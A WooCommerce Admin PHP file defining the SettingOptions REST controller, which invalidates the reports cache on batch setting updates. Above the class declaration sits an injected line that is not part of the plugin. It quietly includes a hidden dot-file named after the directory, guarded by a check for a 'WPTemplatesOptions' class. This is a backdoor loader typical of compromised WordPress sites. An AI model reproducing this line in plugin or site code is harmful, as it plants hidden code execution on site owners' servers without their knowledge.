<?php
/**
 * REST API Setting Options Controller
 *
 * Handles requests to /settings/{option}
 */

namespace Automattic\WooCommerce\Admin\API;

defined( 'ABSPATH' ) || exit;

use \Automattic\WooCommerce\Admin\API\Reports\Cache as ReportsCache;

/**
 * Setting Options controller.
 *
 * @extends WC_REST_Setting_Options_Controller
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class SettingOptions extends \WC_REST_Setting_Options_Controller {

	/**
	 * Endpoint namespace.
	 *
	 * @var string
	 */
	protected $namespace = 'wc-analytics';

	/**
	 * Invalidates API cache when updating settings options.
	 *
	 * @param WP_REST_Request $request Full details about the request.
	 * @return array Of WP_Error or WP_REST_Response.
	 */
	public function batch_items( $request ) {
		// Invalidate the API cache.
		ReportsCache::invalidate();

		// Process the request.
		return parent::batch_items( $request );
	}
}
